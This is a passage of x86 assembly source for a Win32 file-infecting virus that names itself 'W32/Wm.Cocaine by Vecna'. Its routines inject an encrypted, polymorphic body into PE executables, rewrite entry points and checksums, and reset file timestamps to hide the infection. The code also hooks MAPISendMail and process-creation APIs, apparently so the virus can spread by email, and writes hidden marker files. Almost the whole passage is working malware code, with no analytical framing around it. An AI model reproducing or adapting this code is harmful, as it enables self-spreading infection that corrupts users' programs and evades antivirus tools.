       push 00002000h+00001000h+00100000h
       push 32*1024
       push 0
       call [ebp+(ofs _VirtualAlloc-ofs vcode)]
       mov [ebp+(ofs buffer1-ofs vcode)], eax  ;alloc 2 bufferz for poly
       mov edi, eax
       mov esi, ebp
       mov ecx, vsize
       rep movsb                               ;init first buffer
       popad

       lea eax, [ebp+(ofs kernel-ofs vcode)]   ;search in kernel32
       mov [ebp+(ofs dll_name-ofs vcode)], eax
       lea eax, [ebp+(ofs sGetProcAddress-ofs vcode)]
       call SearchIT
       push eax                                ;push GetProcAdress
       lea eax, [ebp+(ofs sGetModuleHandle-ofs vcode)]
       call SearchIT
       push eax                                ;push GetModuleHandleA
       lea eax, [ebp+(ofs sCreateProcessA-ofs vcode)]
       call SearchIT
       push eax                                ;push CreateProcessA
       lea eax, [ebp+(ofs sWinExec-ofs vcode)]
       call SearchIT
       push eax                                ;push WinExec

       lea eax, [ebp+(ofs mapi-ofs vcode)]     ;search in mapi32
       mov [ebp+(ofs dll_name-ofs vcode)], eax
       lea eax, [ebp+(ofs sMAPISendMail-ofs vcode)]
       call SearchIT
       push eax                                ;push MAPISendMail

       sub ecx, ecx
       mov edx, [edi+seh_rva]
       add edx, [edi+seh_rawsz]                       ;rva+raw size=ep
       mov [ebp+(ofs ep-ofs vcode)], edx
       mov ecx, [esi+peh_imagebase]
       add edx, ecx                            ;ep+base=delta run
       mov eax, [esi+peh_entrypoint]

       mov esi, [ebp+(ofs buffer1-ofs vcode)]
       mov edi, [ebp+(ofs buffer2-ofs vcode)]

       mov [esi+(ofs _delta-ofs vcode)], edx   ;set delta in copy
       mov [esi+(ofs _base-ofs vcode)], ecx
       sub eax, [ebp+(ofs ep-ofs vcode)]
       sub eax, 4+(ofs host_entry-ofs vcode)
       mov [esi+(ofs host_entry-ofs vcode)], eax ;set entrypoint in copy

       pop eax
       mov [esi+(ofs OldMAPISendMail-ofs vcode)], eax
       pop eax
       mov [esi+(ofs OldWinExec-ofs vcode)], eax
       pop eax
       mov [esi+(ofs OldCreateProcessA-ofs vcode)], eax
       pop eax
       mov [esi+(ofs OldGetModuleHandleA-ofs vcode)], eax
       pop eax
       mov [esi+(ofs OldGetProcAddress-ofs vcode)], eax

       mov by [esi+(ofs RestoreChunkz-ofs vcode)], FALSE
       cmp dwo [ebp+(ofs RawSize-ofs vcode)], MIN_RAW
       jb @@a

       pushad

       lea edi, [esi+(ofs rbuf-ofs vcode)]     ;start of restoration table
       push edi
       mov ecx, (MAX_BRANCH*(128+4+4))/4
  @@be0:
       call random0                            ;fill buffer with garbage
       stosd
       loop @@be0

       sub eax, eax
       mov [ebp+(ofs reg32-ofs vcode)], eax    ;init internal vars
       mov [ebp+(ofs lparm-ofs vcode)], eax
       mov [ebp+(ofs lvars-ofs vcode)], eax
       mov [ebp+(ofs subs_index-ofs vcode)], eax
       mov [ebp+(ofs s_into-ofs vcode)], eax   ;allow call

       mov by [ebp+(ofs recurse-ofs vcode)], MAX_RECURSION-2
       pop edi

       mov eax, [ebp+(ofs old_eip-ofs vcode)]  ;first chunk at
       sub ecx, ecx                            ;counter
  @@be1:
       inc ecx                                 ;chunk count
       stosd                                   ;starting RVA
       stosd                                   ;(make space for size)
       call virtual2physical_
       or eax, eax
       jz @@fux0red
       mov esi, eax
       add esi, [ebp+(ofs map@-ofs vcode)]

       push ecx
       mov ecx, 128
       push esi edi
       rep movsb                               ;copy bytes at chunk
       pop esi edi
       pop ecx

       lea ebx, [edi-5]
       call crypt_poly
       call garble                             ;make junk
       call crypt_poly
       mov [esi-4], edi                        ;(destine
       sub [esi-4], ebx                        ;- previous destine(b4 junk))
                                               ;==size
       mov al, 0e9h
       stosd
       stosb                                   ;make JMP

       pushad                                  ;choose a suitable EIP for next
  @@ce0:                                       ;chunk(not overlapping)
       mov eax, [ebp+(ofs RawSize-ofs vcode)]
       sub eax, 12345678h
  it_size equ dwo $-4
       call random
       add eax, [ebp+(ofs sRVA-ofs vcode)]      ;eip=rnd(rva)+base
       sub edx, edx
       sub ebx, ebx                    ;init ok_counter,checked_counter
       lea edi, [ebp+(ofs rbuf-ofs vcode)]
  @@ce1:
       mov esi, [edi]
       add esi, [edi+4]                ;entrypoint is above the end(point+sz)
       cmp eax, esi                    ;last one, so, is valid(for dis entry)
       ja @@ce3
       mov esi, [edi]                  ;entrypoint is below current one - 129
       sub esi, 129                    ;so, it have enought room to grown, ok
       cmp eax, esi
       jnb @@ce2
  @@ce3:
       inc edx                         ;this one is ok
  @@ce2:
       add edi, [edi+4]                ;update pointer to next chunk info
       add edi, 4*2
       inc ebx

       cmp ecx, ebx                    ;all entries checked? no, continue
       jne @@ce1

       cmp ecx, edx                    ;eip allowed for all our entries?
       jne @@ce0

       mov [esp+(7*4)], eax            ;fix eax(stack)
       popad

       push eax

       call virtual2physical_
       add eax, [ebp+(ofs map@-ofs vcode)]
       mov ebx, edi
       sub eax, ebx                            ;calc distance between chunks
       mov [edi-4], eax                        ;patch JMP
       lea eax, [edi-4]                        ;last patcheable jump
       sub eax, [ebp+(ofs map@-ofs vcode)]
       mov [ebp+(ofs patch_jump-ofs vcode)], eax
       mov edi, esi
       add edi, [edi-4]                        ;edi(table)=edi+2 dwords+junk
                                               ;(cut excess copied bytes)
       pop eax
       cmp ecx, MAX_BRANCH                     ;process next chunk
       jb @@be1
       popad

       mov by [esi+(ofs RestoreChunkz-ofs vcode)], TRUE

  @@a:
       pushad
       mov edi, esi
       mov eax, [ebp+(ofs key1-ofs vcode)]
       mov ecx, (ofs dec_end_code-ofs vcode)/4
  @@loop1:
       xor [edi], eax                          ;do 2nd loop(internal)
       scasd
       add eax, [ebp+(ofs key2-ofs vcode)]
       loop @@loop1
       popad
       mov eax, (ofs DecriptInit-ofs vcode)    ;where our code get control
       mov ecx, vsize
       call mutate                             ;encript
       mov by [ebp+(ofs inf?-ofs vcode)], -1   ;set continue infecting
       mov [ebp+(ofs polybuffer-ofs vcode)], edi
       add [ebp+(ofs ep-ofs vcode)], eax       ;add poly entry to file entry
       cmp ecx, msize                          ;if poly decriptorz dont fill
       jnb @@3                                 ;bufferz, make it bufsize long
       mov ecx, msize
  @@3:
       mov [ebp+(ofs tamanho-ofs vcode)], ecx
  @@0:
       call UnmapFile
  @@1:
       movzx eax, by [ebp+(ofs inf?-ofs vcode)]
       or eax, eax
       mov by [ebp+(ofs inf?-ofs vcode)], 0    ;continue processing?
       jz remove_seh
       mov eax, [ebp+(ofs tamanho-ofs vcode)]
       add eax, [ebp+(ofs fsizel-ofs vcode)]
       call AlignD                             ;round mapsize to infected
       mov [ebp+(ofs fsizel-ofs vcode)], eax   ;mark
       call MapFile
       or eax, eax                             ;error mapping(all is fux0red)
       jz @@1
       mov ebx, eax
       mov [ebp+(ofs map@-ofs vcode)], eax
       add eax, [eax+3ch]
       mov esi, eax
       mov edi, eax
       mov [ebp+(ofs pe_header-ofs vcode)], edi
       movzx ecx, wo [esi+peh_nosections]
       dec ecx
       mov eax, ecx
       shl eax, 3
       shl ecx, 5
       add eax, ecx
       movzx ecx, wo [esi+peh_ntheader]
       add eax, ecx
       sub ecx, ecx                            ;esi=pe header
       add eax, 24                             ;ebx=map base
       add edi, eax                            ;edi=last section header

       mov [esi+peh_reloc1], ecx
       mov [esi+peh_reloc2], ecx               ;no more relocz

       push edi esi

       xchg edi, esi
       mov edi, [esi+seh_raw]
       add edi, [esi+seh_rawsz]
       cmp dwo [ebp+(ofs RawSize-ofs vcode)], MIN_RAW
       jb @@11

       pushad
       mov edi, [ebp+(ofs patch_jump-ofs vcode)]
       mov eax, edi
       add edi, ebx
       call physical2virtual_                  ;get rva of jump immediate
       mov ebx, eax
       mov eax, [ebp+(ofs ep-ofs vcode)]
       sub eax, ebx                            ;sub it from new eip
       sub eax, 4
       mov [edi], eax                          ;patch jmp
       popad

       jmp @@12
  @@11:
       mov eax, [ebp+(ofs ep-ofs vcode)]       ;get new eip
       mov esi, [esp]
       mov [esi+peh_entrypoint], eax           ;set it in pe header
  @@12:
       add edi, ebx                            ;edi=raw ofs+raw sz+mbase
       mov esi, [ebp+(ofs polybuffer-ofs vcode)]
       mov edx, [ebp+(ofs tamanho-ofs vcode)]
       mov ecx, edx
       cld
       rep movsb                               ;zopy vilus codle

       pop esi edi
       mov [esi+peh_chksum], ecx               ;zero checksum
       mov eax, edx
       add eax, [esi+peh_initdata]             ;init data size+vsize
       call AlignF
       mov [esi+peh_initdata], eax
       mov [edi+seh_attr], 80000000h+40000000h+00000040h

       ;NT COMPATIBILITY ZONE
       ;all to make pe infection NT compliant is here
       ;hehe... you also must get the APIs right, of course
       push dwo [ebp+(ofs fsizel-ofs vcode)]
       push ebx
       mov eax, [edi+seh_rawsz]
       mov ebx, [edi+seh_rvasz]
;       mov edx, [ebp+(ofs tamanho-ofs vcode)]
       add eax, edx
       add ebx, edx                            ;increase raw/virtual size
       call AlignF
       mov [edi+seh_rawsz], eax                ;save aligned raw size
       xchg eax, ebx
       call AlignO                             ;align virtual size
       cmp eax, ebx
       jnb @@4                                 ;is below raw size?
       mov eax, ebx
       call AlignO                             ;then use raw size, realigned
  @@4:
       mov [edi+seh_rvasz], eax                ;save aligned virtual size
       mov eax, [edi+seh_rvasz]                ;calculate last memory occuped
       add eax, [edi+seh_rva]
       call AlignO                             ;align
       cmp eax, [esi+peh_imagesize]            ;is bigger than previous one?
       jb @@aa
       mov [esi+peh_imagesize], eax            ;if so, fix imagesize
  @@aa:

       call ChecksumMappedFile
       mov [esi+peh_chksum], eax

       push 00004000h+00008000h
       push 0
       push dwo [ebp+(ofs buffer1-ofs vcode)]
       call [ebp+(ofs _VirtualFree-ofs vcode)]
       push 00004000h+00008000h
       push 0
       push dwo [ebp+(ofs buffer2-ofs vcode)]
       call [ebp+(ofs _VirtualFree-ofs vcode)] ;free bufferz
       mov by [ebp+(ofs inf?-ofs vcode)], 0
       jmp @@0

  @@fux0red:
       popad
       jmp @@a

wavp db 'AVP Monitor',0                        ;inserted in middle of code ;)

  remove_seh:
       sub edx, edx
       pop dwo fs:[edx]                        ;remove frame
       pop edx
       ret
Infect endp

AlignD proc
       push ebp edx
       mov ebp, DIV_VALUE
       jmp _align
AlignD endp

AlignO proc
       push ebp edx
       mov ebp, [esi+56]
       jmp _align
AlignO endp

AlignF proc
       push ebp edx
       mov ebp, [esi+60]
  _align:
       sub edx, edx
       div ebp
       test edx, edx
       jz @@1
       inc eax
       sub edx, edx
  @@1:
       mul ebp
       pop edx ebp
       ret
AlignF endp

WriteMem proc
       push 0                                  ;result
       push ecx                                ;size
       push esi                                ;buffer from
       push edi                                ;where write
       call [ebp+(ofs _GetCurrentProcess-ofs vcode)]
       push eax                                ;handle to process
       call [ebp+(ofs _WriteProcessMemory-ofs vcode)]
       ret
WriteMem endp

cp_key  db 0

GetList proc
       lea edi, [ebp+(ofs directory-ofs vcode)]
       push MAX_PATH
       push edi
       call [ebp+(ofs _GetSystemDirectoryA-ofs vcode)]
       lea edi, [edi+eax]
       call @@1
       db '\BRSCBC.DAT', 0
  @@1:
       pop esi
  @@2:
       lodsb
       stosb
       test al, al
       jnz @@2
       ret
GetList endp

CheckList proc
       push eax
       call GetList
       mov dwo [ebp+(ofs fsizel-ofs vcode)], 1*4
       inc by [ebp+(ofs mf_mode-ofs vcode)]
       inc by [ebp+(ofs mf_mode1-ofs vcode)]
       call MapFile
       mov [ebp+(ofs map@-ofs vcode)], eax
       dec by [ebp+(ofs mf_mode-ofs vcode)]
       dec by [ebp+(ofs mf_mode1-ofs vcode)]
       mov edi, eax
       test eax, eax
       pop eax
       jz @@1
       mov ecx, [ebp+(ofs fsizel-ofs vcode)]
       shr ecx, 2
       repne scasd
       push ecx
       call UnmapFile
       pop eax
  @@1:
       ret
CheckList endp

InsertList proc
       call GetList
       sub eax, eax
       push eax
       push 80h
       push 3
       push eax eax
       push 0c0000000h                         ;read/write
       lea eax, [ebp+(ofs directory-ofs vcode)]
       push eax
       call [ebp+(ofs _CreateFileA-ofs vcode)]
       inc eax
       jz @@1
       dec eax

       push eax

       sub ecx, ecx
       push 2
       push ecx
       push ecx
       push eax
       call [ebp+(ofs _SetFilePointer-ofs vcode)]

       mov eax, [esp]

       push 0
       call @@2
       dd 0
  @@2:
       push 4
       lea ecx, [ebp+(ofs email_crc-ofs vcode)]
       push ecx
       push eax
       call [ebp+(ofs _WriteFile-ofs vcode)]

       call [ebp+(ofs _CloseHandle-ofs vcode)]

  @@1:
       ret
InsertList endp

ChecksumMappedFile proc
       push ebp
       mov ebp, esp
       push esi
       push ecx
       push edx
       xor edx, edx
       mov esi, [ebp+8]
       mov ecx, [ebp+12]
       shr ecx, 1
  @@1:
       movzx eax, wo [esi]
       add edx, eax
       mov eax, edx
       and edx, 0FFFFh
       shr eax, 10h
       add edx, eax
       add esi, 2
       loop @@1
       mov eax, edx
       shr eax, 10h
       add ax, dx
       add eax, [ebp+12]
       pop edx
       pop ecx
       pop esi
       leave
       retn    8
ChecksumMappedFile endp

SearchIT proc
       pushad
       call sne
       mov esp,[esp+8]                         ;fix stack
_rseh:
       sub eax, eax                            ;signal not found
       jmp rseh
sne:
       sub edx, edx
       push dwo fs:[edx]
       mov fs:[edx], esp                       ;set SEH
       call gpa_kernel32                       ;get add for the case it is bound
       mov edi, eax
       mov eax, dwo [esi+128]                  ;import dir
       push edi
       call virtual2physical
       pop edi
       jc @@3
       mov edx, eax
       add edx, ebx
  @@2:
       cmp dwo [edx], 0
       je @@3
       mov eax, [edx+12]                       ;get module name
       push edi
       call virtual2physical
       pop edi
       jc @@0
       add eax, ebx
       mov ecx, 12345678h
  dll_name equ dwo $-4
       call strcmp
       jz @@1
  @@0:
       add edx, 20                             ;check next
       jmp @@2                                 ;process next dir
  @@3:
       jmp _rseh
  @@1:
       mov eax, [edx+16]                       ;pointer to name table pointer
       mov ebp, eax
       push edi
       call virtual2physical
       pop edi
       jc @@3
       add eax, ebx
       mov edx, esi
       mov esi, eax
       sub ecx, ecx
  @@4:
       lodsd                                   ;load pointer to name
       test eax, eax
       jz @@3                                  ;ebx=base
       inc ecx
       cmp eax, edi
       jz @@6
       cmp eax, 077f00000h
       ja @@4                                  ;pointing to kernel? is bound
       xchg esi, edx
       push edi
       call virtual2physical                   ;edx=table esi=pe header
       pop edi
       jc @@3
       push edi
       mov edi, [esp+(7*4)+4+8]                ;load requested API
       push esi
       lea esi, [eax+ebx+2]
       dec edi
  @@7:
       inc edi
       lodsb
       test al, al
       jz @@5
       cmp [edi], al
       je @@7
       pop esi
       pop edi
       xchg esi, edx                           ;esi=table edx=pe header
       jmp @@4
  @@5:
       pop eax
       pop eax
  @@6:
       dec ecx
       lea eax, [ebp+(ecx*4)]
  rseh:
       sub edx, edx
       pop dwo fs:[edx]                        ;remove frame
       pop edx
       mov dwo [esp+(7*4)], eax
       popad
       ret
SearchIT endp

strcmp proc
       push edx ebx edi
  @@2:
       mov bl, [eax]
       cmp bl, 'a'
       jb @@3
       cmp bl, 'z'
       ja @@3
       and bl, not 20h
  @@3:
       cmp by [ecx], 0
       jz @@1
       cmp [ecx], bl
       jnz @@1
       inc ecx
       inc eax
       jmp @@2
  @@1:
       pop edi ebx edx
       ret
strcmp endp

virtual2physical proc
       push ecx esi
       mov edi, esi
       movzx ecx, wo [esi+20]
       add edi, 24
       add edi, ecx                            ;edi eq 1th section header
       movzx ecx, wo [esi+peh_nosections]
  @@0:
       push eax
       sub eax, [edi+12]                       ;sub RVA
       cmp eax, [edi+8]                        ;pointing inside?
       jb @@1
       pop eax
       add edi, 40                             ;next section header
       loop @@0
       sub eax, eax
       stc                                     ;signal error
       jmp @@2
  @@1:
       add eax, [edi+20]                       ;add raw pointer
       pop ecx                                 ;fix stack
  @@2:
       pop esi ecx                             ;eax=fisical place
       ret                                     ;edi=section
virtual2physical endp

virtual2physical_ proc
       pushad
       mov esi, [ebp+(ofs pe_header-ofs vcode)]
       call virtual2physical
       mov [esp+(7*4)], eax
       popad
       ret
virtual2physical_ endp

physical2virtual_ proc
       pushad
       mov esi, [ebp+(ofs pe_header-ofs vcode)]
       call physical2virtual
       mov [esp+(7*4)], eax
       popad
       ret
physical2virtual_ endp

physical2virtual proc
       push ecx esi
       mov esi, [ebp+(ofs pe_header-ofs vcode)]
       mov edi, esi
       movzx ecx, wo [esi+20]
       add edi, 24
       add edi, ecx                            ;edi eq 1th section header
       movzx ecx, wo [esi+peh_nosections]
  @@0:
       push eax
       sub eax, [edi+20]                       ;sub physical start
       cmp eax, [edi+16]                        ;still pointing to this section
       jb @@1
       pop eax
       add edi, 40                             ;next section header
       loop @@0
       sub eax, eax
       stc                                     ;signal error
       jmp @@2
  @@1:
       add eax, [edi+12]                       ;add rva
       pop ecx
  @@2:
       pop esi ecx                             ;eax=fisical place
       ret                                     ;edi=section
physical2virtual endp

MapFile proc
       mov eax, [ebp+(ofs mm_on_off-ofs vcode)]
       test eax, eax
       jz @@1                                  ;if [mm_on_off] contains a @
       clc                                     ;treat it like a memory mapped
       ret                                     ;file
  @@1:
       push -1
  mf_mode1 equ by $-1

       pop ecx
       jecxz @@212

       push 80h
       lea eax, [ebp+(ofs directory-ofs vcode)]
       push eax
       call [ebp+(ofs _SetFileAttributesA-ofs vcode)]
       test eax, eax
       jz error_map                            ;blank attributes

  @@212:
       sub eax, eax
       push eax
       push 80h
       push 3
  mf_mode equ by $-1
       push eax eax
       push 0c0000000h                         ;read/write
       lea eax, [ebp+(ofs directory-ofs vcode)]
       push eax
       call [ebp+(ofs _CreateFileA-ofs vcode)]
       inc eax
       jz error_mapf
       dec eax
       mov [ebp+(ofs handle1-ofs vcode)], eax

       sub ebx, ebx

       cmp [ebp+(ofs fsizel-ofs vcode)], ebx
       jne @@2

       push ebx
       push eax
       call [ebp+(ofs _GetFileSize-ofs vcode)]
       mov [ebp+(ofs fsizel-ofs vcode)], eax
       sub edx, edx
       mov ecx, DIV_VALUE
       div ecx
       test edx, edx
       jz close_map

  @@2:

       sub eax, eax
       push eax
       push dwo [ebp+(ofs fsizel-ofs vcode)]
       push eax
       push 4
       push eax
       push dwo [ebp+(ofs handle1-ofs vcode)]
       call [ebp+(ofs _CreateFileMappingA-ofs vcode)]
       test eax, eax
       jz close_map
       mov [ebp+(ofs handle2-ofs vcode)], eax
       sub eax, eax
       push dwo [ebp+(ofs fsizel-ofs vcode)]
       push eax eax
       push 2
       push dwo [ebp+(ofs handle2-ofs vcode)]
       call [ebp+(ofs _MapViewOfFile-ofs vcode)]
       test eax, eax
       jz unmap_map
       ret
MapFile endp

CheckName proc
       push ebp
       call _seh
       mov esp,[esp+8]                         ;fix stack
       jmp remove_seh
_seh:
       sub ecx, ecx
       push dwo fs:[ecx]
       mov fs:[ecx], esp
       cld
       call delta
       lea edi, [ebp+(ofs directory-ofs vcode)]
       push edi
       mov esi, [esp+(7*4)+(4*6)+(2*4)]      ;get pointer to path name
  @@1:
       lodsb
       cmp al, '\'
       jne @@5
       inc ecx                                 ;signal slash found
  @@5:
       cmp al, '"'
       je @@1
       cmp al, "'"                             ;ignore these
       je @@1
       cmp al, 'a'
       jb @@3
       cmp al, 'z'
       ja @@3
       and al, not 20h                         ;make upcase
  @@3:
       stosb
       test al, al
       jnz @@1
       dec edi
       jecxz @@7
  @@2:
       mov al, by [edi-1]
       cmp al, 20h
       je @@8
       add bl, al                              ;calc chksum
  @@8:
       dec edi
       cmp al, '\'                             ;find backslash
       jnz @@2
  @@7:
       mov eax, edi
       pop edx
       jecxz @@6
       sub eax, edx
       push ebx
       call ProcessDir                         ;process directory
       pop ebx
  @@6:
       sub edx, edx
       pop dwo fs:[edx]                        ;remove frame
       pop edx
       pop ebp
       ret
CheckName endp

UnmapFile proc
       mov eax, [ebp+(ofs mm_on_off-ofs vcode)]
       test eax, eax
       jz @@1
       clc
       ret
  @@1:
       push dwo [ebp+(ofs map@-ofs vcode)]
       call [ebp+(ofs _UnmapViewOfFile-ofs vcode)]
  unmap_map:
       push dwo [ebp+(ofs handle2-ofs vcode)]
       call [ebp+(ofs _CloseHandle-ofs vcode)]
  close_map:
       lea eax, dwo [ebp+(ofs lw_creat_h-ofs vcode)]
       push eax
       sub eax, 8
       push eax
       sub eax, 8
       push eax
       push dwo [ebp+(ofs handle1-ofs vcode)]
       call [ebp+(ofs _SetFileTime-ofs vcode)]
       push dwo [ebp+(ofs handle1-ofs vcode)]
       call [ebp+(ofs _CloseHandle-ofs vcode)]
  error_mapf:
       push dwo [ebp+(ofs fattr-ofs vcode)]
       lea eax, [ebp+(ofs directory-ofs vcode)]
       push eax
       call [ebp+(ofs _SetFileAttributesA-ofs vcode)]
  error_map:
       sub eax, eax
       ret
UnmapFile endp

random0 proc
       sub eax, eax
random proc
       push ecx edx
       push eax
       call delta
       mov eax, [ebp+(ofs pseed-ofs vcode)]
       mov ecx, 41c64e6dh
       mul ecx
       add eax, 3039h
       and eax, 7ffffffh
       mov [ebp+(ofs pseed-ofs vcode)], eax
       pop ecx
       jecxz @@3                               ;limit set?
       sub edx, edx
       div ecx
       xchg eax, edx                           ;value = rnd MOD limit
  @@3:
       mov ecx, [esp+(2*4)]                    ;ecx=ret address
       cmp by [ecx], 0cch                      ;is ret address a int3?
       jne @@4
       jmp ebp                                 ;if so, start to exec garbage
  @@4:
       pop edx ecx
       sahf                                    ;random flagz
       ret
random endp
random0 endp

;name   +4
;size   +8
;buffer +12
WriteDump proc
       sub eax, eax
       push eax
       push 12345678h                          ;hidden file
  wd_att equ dwo $-4
       push 2
       push eax eax
       push 0c0000000h                         ;read/write
       push dwo [esp+4+(6*4)]
       call [ebp+(ofs _CreateFileA-ofs vcode)]
       mov ebx, eax

       push 0
       call @@61
       dd 0
  @@61:
       push dwo [esp+8+(2*4)]
       push dwo [esp+12+(3*4)]
       push ebx
       call [ebp+(ofs _WriteFile-ofs vcode)]
       push ebx
       call [ebp+(ofs _CloseHandle-ofs vcode)]
       ret 12
WriteDump endp

FileMask db '\*.*', 0, 0, 0, 0

macro_crypt proc
       pushad
       mov al, 0
  macro_key equ by $-1
       mov ecx, ofs macro_end-ofs macro_start
       lea edi, [ebp+(ofs macro_start-ofs vcode)]
  @@1:
       xor by [edi], al
       inc edi
       loop @@1
       popad
       ret
macro_crypt endp

CRC32  proc
       cld
       push ebx
       mov ecx, -1
       mov edx, ecx
  NextByteCRC:
       xor eax, eax
       xor ebx, ebx
       lodsb
       xor al, cl
       mov cl, ch
       mov ch, dl
       mov dl, dh
       mov dh, 8
  NextBitCRC:
       shr bx, 1
       rcr ax, 1
       jnc NoCRC
       xor ax, 08320h
       xor bx, 0edb8h
  NoCRC:
       dec dh
       jnz NextBitCRC
       xor ecx, eax
       xor edx, ebx
       dec di
       jnz NextByteCRC
       not edx
       not ecx
       pop ebx
       mov eax, edx
       rol eax, 16
       mov ax, cx
       ret
CRC32  endp

OpenAncev proc
       sub eax, eax
       push eax
       push 80h
       push 3
       push eax eax
       push 80000000h
       call @@1
ancevsys db 'C:\ANCEV.SYS', 0
  @@1:
       call [ebp+(ofs _CreateFileA-ofs vcode)]
       inc eax
       jz @@filedontexists
       dec eax
       push eax
       call [ebp+(ofs _CloseHandle-ofs vcode)]
  @@fileexists:
       clc
       ret
  @@filedontexists:
       stc
       ret
OpenAncev endp

align 4

dec_end_code equ this byte

DecriptInit proc
       cld
       sub eax, eax
       db 0b8h+5                               ;mov ebp, delta
_delta dd 00403000h
       lea ebx, [ebp+(ofs vinit-ofs vcode)]
       push ebx
       lea ebx, [ebp+(ofs dec_end_code-ofs vcode)]
       push dwo fs:[eax]
       mov fs:[eax], esp                       ;set new seh frame
       mov edi, ebp
       mov eax, 0
  key1 equ dwo $-4
  @@1:
       xor [edi], eax
       scasd
       add eax, 12345678h
     org $-4
  key2 dd 0
       cmp edi, ebx
       jne @@1
       mov eax, cs:[0]                         ;cause fault
DecriptInit endp

ENDIF

vend   equ this byte                           ;END OF PHYSICAL BODY

       db 'EOV', 0

align 4

k32_address      equ this byte
_CreateProcessA  dd 0
_CreateFileA     dd 0
_WinExec         dd 0
_CloseHandle     dd 0                          ;add here a var that hold the
_LoadLibraryA    dd 0
_FreeLibrary    dd 0
_CreateFileMappingA dd 0
_MapViewOfFile   dd 0
_UnmapViewOfFile dd 0
_FindFirstFileA  dd 0
_FindNextFileA   dd 0
_FindClose       dd 0
_SetEndOfFile    dd 0
_VirtualAlloc    dd 0
_VirtualFree     dd 0
_GetSystemTime   dd 0
_GetWindowsDirectoryA dd 0
_GetSystemDirectoryA dd 0
_GetCurrentDirectoryA dd 0
_SetFileAttributesA dd 0
_SetFileTime     dd 0
_ExitProcess     dd 0
_GetCurrentProcess dd 0
_WriteProcessMemory dd 0
_WriteFile       dd 0
_DeleteFileA     dd 0
_Sleep           dd 0
_CreateThread    dd 0
_GetFileSize     dd 0
_SetFilePointer  dd 0

_MessageBoxA     dd 0
_FindWindowA     dd 0
_PostMessageA    dd 0

_RegCloseKey     dd 0
_RegQueryValueEx dd 0
_RegOpenKeyEx    dd 0
_RegCreateKeyEx  dd 0
_RegSetValueEx   dd 0

_GetModuleHandle dd 0
_GetProcAddress  dd 0                          ;basic api init

_connect         dd 0
_recv            dd 0

_MAPISendMail    dd 0

old_eip dd 0                                   ;first entrypoint place

patch_jump dd 0                                ;where last jump is(patch!!)

sRVA    dd 0                                   ;CODE section paramz, for
RawSize dd 0                                   ;branch_entry

lgarble db 0                                   ;last garble indicator
inf?    db 0                                   ;can infect file?

_dec   dw 0                                    ;instruction used to decript

K32     dd 0                                   ;kernel32 base
U32     dd 0                                   ;user32 base

pseed   dd 0                                   ;poly seed

variables dd 0

reg32   dd 0                                   ;table of reg used
buffer  dd 0                                   ;current work buffer
_size   dd 0                                   ;size to encript
entry   dd 0                                   ;delta to entrypoint
rva     dd 0                                   ;place in meory where virus
                                               ;will run
flagz  dd 0                                    ;garbling flagz
c_reg  dd 0                                    ;actual counter reg
p_reg  dd 0                                    ;actual pointer reg
recurse   dd 0                                 ;recursion deep
decriptor dd 0                                 ;start of decriptor in current
                                               ;buffer

search_handle dd 0

_socket   dd 0
socket    dd MAX_SOCK dup (0)
recv_size dd 0
recv_buff dd 0
email_w   dd 0
thread    dd 0
email     db 128 dup (0)

email_crc dd 0

secz     db 0

mdeep    db 0

align 4

handle1  dd 0
handle2  dd 0
map@     dd 0                                  ;map address

tamanho  dd 0                                  ;total added size
ep       dd 0                                  ;new entrypoint

image_infect dd 0

OurTimer   dd 0
polybuffer dd 0                                ;address of buffer for poly

buffer1 dd 0                                   ;temporary poly bufferz
buffer2 dd 0

mm_on_off    dd 0

pe_header    dd 0

seed   dd 0                                    ;main random seed

_mapi  dd 0

subject dd 0

directory db MAX_PATH dup (0)                  ;work directory structure

lparm      dd 0
lvars      dd 0
subs_index dd 0

s_into     db 0
_pusha     db 0

fname      db 32 dup (0)

align 4

current_time equ this byte
_year        dw 0
_month       dw 0
_dayofweek   dw 0
_day         dw 0
_hour        dw 0
_minute      dw 0
_second      dw 0
_milisecond  dw 0

find_data     equ this byte
fattr         dd 0
 c_creat_h    dd 0
  c_creat_l   dd 0
 la_creat_h   dd 0
  la_creat_l  dd 0
 lw_creat_h   dd 0
  lw_creat_l  dd 0
fsizeh        dd 0
fsizel        dd 0
reserved      dd 0, 0
filename      db 260 dup (0)
altname       db 13 dup (0)
altext        db 3 dup (0)

subs_table db 6*MAX_SUBROUTINES dup (0)        ;dd where sub reside
                                               ;db no. of param that sub clean
                                               ;db no. of vars that sub alloc

MapiMessage struc
       resd               dd ?
       lpszSubject        dd ?
       lpszNoteText       dd ?
       lpszMessageType    dd ?
       lpszDateReceived   dd ?
       lpszConversationID dd ?
       flags              dd ?
       lpOriginator       dd ?
       nRecipCount        dd ?
       lpRecips           dd ?
       nFileCount         dd ?
       lpFiles            dd ?
MapiMessage ends

MapiRecipDesc struc
       resd               dd ?
       ulRecipClass       dd ?
       lpszName           dd ?
       lpszAddress        dd ?
       ulEIDSize          dd ?
       lpEntryID          dd ?
MapiRecipDesc ends

MapiFileDesc struc
       resd               dd ?
       flFlags            dd ?
       nPosition          dd ?
       lpszPathName       dd ?
       lpszFileName       dd ?
       lpFileType         dd ?
MapiFileDesc ends

MF    MapiFileDesc  <0>

mend   equ this byte

_VSEG  ends

end    main

;----------------------------------(HOST.INC)---------------------------------
;Generic Host
;(c) Vecna 1999

;First generation host. Just pass control to virus and, when get control again
;show a dialog box and exit.

_TEXT  segment dword use32 public 'CODE'

       extrn ShellAboutA:Proc
       extrn ExitProcess:pRoc

;I_AM_IDIOT_USER_THAT_CANT_COMPILE EQU TRUE     ;antilamer code :P

main   proc
IFNDEF I_AM_IDIOT_USER_THAT_CANT_COMPILE
       jmp DecriptInit
ENDIF
  host:
       push 0
       push ofs tit
       push ofs msg
       push 0
       call ShellAboutA
       push 0
       call ExitProcess
main   endp

_TEXT  ends

_DATA  segment dword use32 public 'DATA'

tit    db 'W32/Wm.Cocaine by Vecna', 0
msg    db 'Cocaine - A Win32/WinWord Virus#'
       db 'Cocaine - Your PC is now addicted', 0

_DATA  ends

;----------------------------------(HOST.INC)---------------------------------
;-----------------------------------(LZ.INC)----------------------------------
;LZ Decompression routines
;(c) Vecna 1999
;Converted from a C source

;These routines decompress a LZ packed buffer. They where coded in C, and
;converted to ASM using BCC32 with the -S switch. Beside the normal switchs
;to optimize, this was optimized by hand a bit. Virogen have in his www page
;a more optimized version of this routine, and other related material about
;compression in win32asm.

;void fast_copy(p_src,p_dst,len)
;
fast_copy proc
       push edi esi ecx
       mov ecx,dword ptr [esp+ 4+(4*3)]
       mov edi,dword ptr [esp+ 8+(4*3)]
       mov esi,dword ptr [esp+12+(4*3)]
       cld
       rep movsb
       pop ecx esi edi
       ret 12
fast_copy endp


